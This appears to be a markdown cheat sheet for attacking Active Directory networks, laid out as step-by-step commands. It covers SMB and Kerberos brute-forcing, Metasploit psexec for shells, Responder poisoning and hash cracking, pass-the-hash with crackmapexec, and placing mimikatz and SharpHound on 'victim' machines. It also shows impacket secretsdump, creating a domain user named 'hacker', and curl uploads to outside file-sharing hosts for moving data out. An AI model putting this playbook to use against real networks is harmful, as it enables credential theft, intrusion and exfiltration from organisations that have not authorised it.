# <h3> Steps:-</h3>
```
1. First of all we want Inventory of organization
2. Separate IP’S of Systems, Servers, Networking Devices   
3. Verify these IP'S Using PingInfo / AngryIPScanner
4. Standeruser For Auth Scan but try from your END to find user/pass
```
# <h3> Target </h3>
```
For Ad Systems
1). Getting IP
2). Getting Local USER
3). Getting Local USER PASSWORD
4). Dump All Hashes 
5). Enumerate for AD User
6). Enumerate for AD User Password
7). Enumerate for AD Domain
8). Enumerate for AD Domain Password
9). Login
```
# <h3> Brute-Force As Local User On These Port's </h3>
```
FTP(21) 
SSH(22) 
Kerberos(89) 
SMB(139/445) 
LDAP(389) 
MSSQL(1433/1434) 
MYSQL(3306) 
RDP(3389) 
VNC(5900)
```
# <h2> Tool 1. TIP ( But Go For SMB First ) Only For local user account. </h2>
```
msfconsole
auxiliary/scanner/smb/smb_login
set PASS_FILE /root/Desktop/pass.txt
set USER_FILE /root/Desktop/user.txt
set RHOSTS file:/root/Desktop/host.txt
```
```
use auxiliary/scanner/smb/smb_enumshares
set rhosts 192.168.1.17
set smbuser user
set smbpass pass
exploit
```
```
use auxiliary/scanner/smb/smb_lookupsid
set rhosts 192.168.1.17
set smbuser user
set smbpass pass
exploit
```
# <h3> FOR METERPRETER SESSION </h3> 
```
use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > setg rhost 10.10.110.200
msf6 exploit(windows/smb/psexec) > setg SMBDomain mgmotor.ad.com
msf6 exploit(windows/smb/psexec) > setg smbpass Pass@1234
msf6 exploit(windows/smb/psexec) > setg smbuser 9000
msf6 exploit(windows/smb/psexec) > show targets 

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Automatic
    1   PowerShell
    2   Native upload
    3   MOF upload
    4   Command

msf6 exploit(windows/smb/psexec) > run
```
# <h3> If AD Implemented. </h3>
```
set SMBDomain ADDomain 
```
# <h3> If LOCKOUT Policy is Set Then Use. </h3>
```
set ABORT_ON_LOCKOUT true
```
# <h2> Tool 2. Getting USERLLMNR/NBT-NS Poising with the help of Responder. </h2>
```
responder -I ens33 -wdrf
responder -I ens33 -wd
responder -I ens33 -A
responder -I ens33 -wdF -b
responder -I ens33 -wdF --lm --disable-ess
responder -I ens33 -e 192.168.1.2
```
# <h2> Hash Decrypter </h2>
```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
john SMB-NTLMv2-SSP-192.168.100.101.txt –wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 5600 HTTP-NTLMv2-fe80::ddc5:3b8f:e421:a88a.txt /usr/share/wordlists/rockyou.txt
https://crackstation.net/
https://hashes.com/en/decrypt/hash
```
# <h2> Leak Data Checker </h2>
```
https://leakcheck.io/
https://breachdirectory.org/
https://www.dehashed.com/
```
# <h2> Tool 3. ENUM4LINUX. </h2>
```
enum4linux -U 10.10.0.50
enum4linux -S 10.10.0.50
enum4linux -P 10.10.0.50
enum4linux -o 10.10.0.50
enum4linux -U 10.10.0.50
enum4linux -a 10.10.0.50
```
# <h2> Tool 4. SMBMAP. </h2>
```
smbmap -H 192.168.1.40
smbmap -H 192.168.1.17 -u user -p pass
```
# <h2> Tool 5. SMBCLIENT. </h2>
```
smbclient -L //10.10.0.50/
smbclient -L //10.10.0.50/ -U '' -N
smbclient //10.10.0.50/tmp
```
# <h2> Tool 6. KERBRUTE. </h2>
```
msf> use auxiliary/gather/kerberos_enumusers
gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt
enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>
smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>
smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //
nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>
crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username
enum4linux -a -u "user" -p "password" <DC IP>
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

# <h2> Tool 7. Bloodhound. </h2>
```
First Start ------>>>>> neo4j console
Open it in browser ------>>>>> http://localhost:7474/
Login with ------>>>>> neo4j/123456 Default pass is {neo4j/neo4j}
Open ------>>>>> bloodhound in terminal
Login ------>>>>> user/pass
```

# <h3> Connect with victim windows systems and put these 3 files. </h3>
```
1). mimikatz.exe
2). powerView.ps1
3). SharpHound.ps1
```

# <h3> Use these cmds in victim systems. </h3>
```
1). powershell -ep bypass
2). ..\SharpHound.ps1
3). Invoke-Bloodhound -CollectionMethod All -Domain controller.local -ZipFileName loot.Zip
```

# <h3> Take loot.Zip file to import bloodhound in our systems.  </h3>
```
1). import graph ---->>> uploaded file here
2). Check it and enjoy it.
```

# <h2> Tool 8. IMPACKET. </h2>
```
impacket-psexec ad.domain/user:pass@IP
impacket-wmiexec ad.domain/user:pass@IP
impacket-secretsdump ad.domain/user:pass@IP
impacket-GetADUsers ad.domain/user:pass@IP
impacket-mimikatz ad.domain/user:pass@IP
impacket-smbpasswd ad.domain/user:pass@IP
```
# <h2> Tool 9. RPC-Client. </h2>
```
rpcclient -U ad.domain%user:pass IP
Domain Information Query ----->>>> querydominfo
Enumerating Domain Users ----->>>> enumdomusers
Enumerating Domain Groups ----->>>> enumdomgroups
Group Queries ----->>>> querygroup 0x200
User Queries ----->>>> queryuser User
Enumerating Privileges ----->>>> enumprivs
Get Domain Password Information ----->>>> getdompwinfo
Creating Domain User  ----->>>> createdomuser hacker  ----->>>> setuserinfo2 hacker 24 Password@1
Delete Domain User ----->>>> deletedomuser hacker
Net Share Enumeration ----->>>> netshareenumall/netshareenum
```
# <h2> Tool 10. Transfer data from one system to another </h2>
```
1). putty-tools { used if SSH is opened to recevie any file}
pscp user@192.168.138.116:/Users/Aniket/Desktop/task.txt ~/Documents 

2). python http.server
python -m SimpleHTTPServer 9000
python3 -m http.server 9000

3). Keep
Website --------------->>>>> https://www.keep.sh/
CMD --------->>>>> curl --upload-file ./your-file.txt https://free.keep.sh ------>>>>> https://free.keep.sh/9ab64df49d/your-file.txt
Download --------------->>>>> curl -L https://free.keep.sh/9ab64df49d/your-file.txt > your-file.txt 

4). Bashupload
Website --------------->>>>> https://bashupload.com/
CMD --------------->>>>> curl bashupload.com -T your_file.txt
Download --------------->>>>> wget bashupload.com -T your_file.txt
```
# <h2> Exploit Services by Searchsploit, Exploit DB </h2>
